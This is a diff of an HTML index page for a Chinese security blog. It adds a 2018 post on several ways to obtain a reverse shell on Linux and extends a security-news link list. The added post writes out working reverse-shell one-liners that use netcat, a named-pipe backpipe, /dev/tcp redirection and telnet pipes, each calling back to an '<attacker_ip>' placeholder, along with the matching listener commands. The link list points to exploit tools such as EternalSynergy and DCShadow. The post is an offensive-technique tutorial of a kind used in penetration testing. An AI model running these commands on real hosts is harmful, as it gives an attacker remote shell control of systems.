@@ -308,6 +308,156 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/30/reverse-shell的几种方式/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="M0rk">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/uploads/avatar.jpg">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="M0rk's Blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2018/01/30/reverse-shell的几种方式/" itemprop="url">
+                  reverse shell的几种方式
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2018-01-30T15:58:01+08:00">
+                2018-01-30
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+
+          
+            
+          
+
+          
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <h4 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h4><ul>
+<li>这篇文章主要介绍一下几种通过linux内置工具得到reverse shell的几种方法。</li>
+<li>linux(GNUx)有很多的发行版，不同的发现版之前的内置工具、安全机制等都有所不同。</li>
+<li>下文中的几个例子一般在大多数的系统中是通用的。</li>
+<li>这里主要重点关注一下4和5<h4 id="场景"><a href="#场景" class="headerlink" title="场景"></a>场景</h4></li>
+<li>要求能够使用者能够在目标机器上运行一些基本的命令。<h4 id="例子"><a href="#例子" class="headerlink" title="例子"></a>例子</h4></li>
+<li><p>下面的一些例子中使用A代表攻击者（Attacker），T代表Target（目标）</p>
+<h2 id="1-netcat"><a href="#1-netcat" class="headerlink" title="1.netcat"></a>1.netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">nc &lt;attacker_ip&gt; &lt;port&gt; -e /bin/bash 	# T</div><div class="line">nc -n -vv -l -p &lt;port&gt;					# A</div></pre></td></tr></table></figure>
+</li>
+<li><p>现在的netcat版本可能没有-e参数。</p>
+<h2 id="2-netcat-e被禁用或者没有-e参数"><a href="#2-netcat-e被禁用或者没有-e参数" class="headerlink" title="2.netcat -e被禁用或者没有-e参数"></a>2.netcat -e被禁用或者没有-e参数</h2></li>
+<li>那么可以使用下面的命令<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p; nc &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt;	# A</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/2.png" alt=""></p>
+<h2 id="3-不使用netcat"><a href="#3-不使用netcat" class="headerlink" title="3.不使用netcat"></a>3.不使用netcat</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">/bin/bash -i &gt; /dev/tcp/&lt;attacker_ip&gt;/&lt;port&gt; 0&lt;&amp;1 2&gt;&amp;1      # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+<ul>
+<li>这个也是大多数人用的方式，这种方式使用了/dev/tcp套接字的编程特性，重定向/bin/bash到远程系统<h2 id="4-不使用netcat和-dev-tcp"><a href="#4-不使用netcat和-dev-tcp" class="headerlink" title="4.不使用netcat和/dev/tcp"></a>4.不使用netcat和/dev/tcp</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div></pre></td><td class="code"><pre><div class="line">mknod backpipe p &amp;&amp; telnet &lt;attacker_ip&gt; &lt;port&gt; 0&lt;backpipe | /bin/bash 1&gt;backpipe	    # T</div><div class="line">nc -n -vv -l -p &lt;port&gt; 	# A</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/4.png" alt=""></p>
+<ul>
+<li>使用telnet代替nc<h2 id="5-telnet-to-telnet"><a href="#5-telnet-to-telnet" class="headerlink" title="5.telnet to telnet"></a>5.telnet to telnet</h2><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">telnet &lt;attacker_ip&gt; &lt;1st_port&gt; | /bin/bash | telnet &lt;attacker_ip&gt; &lt;2nd_port&gt;     # T</div><div class="line">nc -n -vv -l -p &lt;1st_port&gt; 	# A1</div><div class="line">nc -n -vv -l -p &lt;2nd_port&gt;	# A2</div></pre></td></tr></table></figure>
+</li>
+</ul>
+<p><img src="/2018/01/30/reverse-shell的几种方式/5.png" alt=""></p>
+<ul>
+<li>这第五个其实挺有意思的。这里用了两个telnet的会话去连接到了远程的ip，其中第一个会话用来输入命令，第二个会话用来显示命令执行后的结果<h2 id="6-还有什么其它的方法？"><a href="#6-还有什么其它的方法？" class="headerlink" title="6.还有什么其它的方法？"></a>6.还有什么其它的方法？</h2><h4 id="小结"><a href="#小结" class="headerlink" title="小结"></a>小结</h4></li>
+<li>这里只是一些小技巧，我希望在我们遇到比如某些命令在某个系统中不能使用的时候，或许我们可以发现并使用其它的方式，可以达到同样的效果，而不是在一棵树上吊死<h4 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h4></li>
+<li><a href="https://0x00sec.org/t/spawning-reverse-shells/2133" target="_blank" rel="external">Spawning reverse shells</a></li>
+</ul>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2018/01/29/20180129安全动态/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -390,6 +540,11 @@
 <li>dnscrypt-proxy - 一款 DNS 代理，支持加密的 DNS 协议<br><a href="https://github.com/jedisct1/dnscrypt-proxy" target="_blank" rel="external">https://github.com/jedisct1/dnscrypt-proxy</a></li>
 <li>命令行下的“蒙面歌王”rundll32.exe<br><a href="http://www.freebuf.com/sectool/160696.html" target="_blank" rel="external">http://www.freebuf.com/sectool/160696.html</a></li>
 <li>如何做好首席安全官 – 企业安全体系与架构实现<br><a href="https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/" target="_blank" rel="external">https://www.sec-un.org/%E5%A6%82%E4%BD%95%E5%81%9A%E5%A5%BD%E9%A6%96%E5%B8%AD%E5%AE%89%E5%85%A8%E5%AE%98-%E4%BC%81%E4%B8%9A%E5%AE%89%E5%85%A8%E4%BD%93%E7%B3%BB%E4%B8%8E%E6%9E%B6%E6%9E%84%E5%AE%9E%E7%8E%B0/</a></li>
+<li>Cisco ASA 实验环境的搭建，来自 NCC Group<br><a href="https://github.com/nccgroup/asatools/blob/master/tutorial.md" target="_blank" rel="external">https://github.com/nccgroup/asatools/blob/master/tutorial.md</a></li>
+<li>IoT ARM 漏洞利用开发介绍<br><a href="https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf" target="_blank" rel="external">https://www.exploit-db.com/docs/english/43906-arm-exploitation-for-iot.pdf</a></li>
+<li>wavecrack - 调用 Hashcat 进行密码破解的 Web 操作接口<br><a href="https://github.com/wavestone-cdt/wavecrack" target="_blank" rel="external">https://github.com/wavestone-cdt/wavecrack</a></li>
+<li>Metasploit 框架新集成了 MS17-010 EternalSynergy Exploits，该 Exploits 支持 Windows 2000 到 Windows Server 2016 的所有版本，非常稳定<br><a href="https://github.com/rapid7/metasploit-framework/pull/9473" target="_blank" rel="external">https://github.com/rapid7/metasploit-framework/pull/9473</a></li>
+<li>DCShadow - Active Directory 域控环境中的最新攻击方法<br><a href="https://blog.alsid.eu/dcshadow-explained-4510f52fc19d" target="_blank" rel="external">https://blog.alsid.eu/dcshadow-explained-4510f52fc19d</a></li>
 </ul>
 
           
@@ -1579,138 +1734,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://kevien.github.io/2017/12/18/20171218安全动态/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="M0rk">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/uploads/avatar.jpg">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="M0rk's Blog">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2017/12/18/20171218安全动态/" itemprop="url">
-                  20171218安全动态
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-18T14:23:28+08:00">
-                2017-12-18
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-
-          
-            
-          
-
-          
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h4 id="每周安全动态"><a href="#每周安全动态" class="headerlink" title="每周安全动态"></a>每周安全动态</h4><ul>
-<li>漏洞利用缓解技术之数据执行保护(DEP)<br><a href="https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634" target="_blank" rel="external">https://0x00sec.org/t/exploit-mitigation-techniques-data-execution-prevention-dep/4634</a></li>
-<li>SHADOW ON THE WALL - Shadowsocks 流量的检测、解密、与命令执行漏洞<br><a href="https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/" target="_blank" rel="external">https://x41-dsec.de/security/news/2017/12/18/x41-shadow-on-the-wall/</a></li>
-<li>基于r2的逆向基础 radare2<br><a href="https://sec.xiaomi.com/article/30" target="_blank" rel="external">https://sec.xiaomi.com/article/30</a></li>
-<li><p>shell中&gt;/dev/null 2&gt;&amp;1是什么鬼？<br><a href="http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/" target="_blank" rel="external">http://www.kissyu.org/2016/12/25/shell%E4%B8%AD%3E%20:dev:null%202%20%3E%20&amp;1%E6%98%AF%E4%BB%80%E4%B9%88%E9%AC%BC%EF%BC%9F/</a></p>
-<figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div></pre></td><td class="code"><pre><div class="line">学习了</div></pre></td></tr></table></figure>
-</li>
-<li><p>Invoke-Obfuscation 用例指南 Part 2<br><a href="http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2" target="_blank" rel="external">http://www.danielbohannon.com/blog-1/2017/12/2/the-invoke-obfuscation-usage-guide-part-2</a></p>
-</li>
-<li>merlin - 使用 HTTP 通信的跨平台后渗透测试工具<br><a href="https://github.com/Ne0nd0g/merlin" target="_blank" rel="external">https://github.com/Ne0nd0g/merlin</a></li>
-<li>ropa - 基于 Ropper 实现的一个 GUI 版本的 ROP 链构造工具<br><a href="https://github.com/orppra/ropa" target="_blank" rel="external">https://github.com/orppra/ropa</a></li>
-<li>remote ld_preload exploitation<br><a href="https://www.elttam.com.au/blog/goahead/" target="_blank" rel="external">https://www.elttam.com.au/blog/goahead/</a></li>
-</ul>
-
-          
-        
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <div>
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1760,7 +1783,7 @@
           
             <div class="site-state-item site-state-posts">
               <a href="/archives">
-                <span class="site-state-item-count">155</span>
+                <span class="site-state-item-count">156</span>
                 <span class="site-state-item-name">日志</span>
               </a>
             </div>
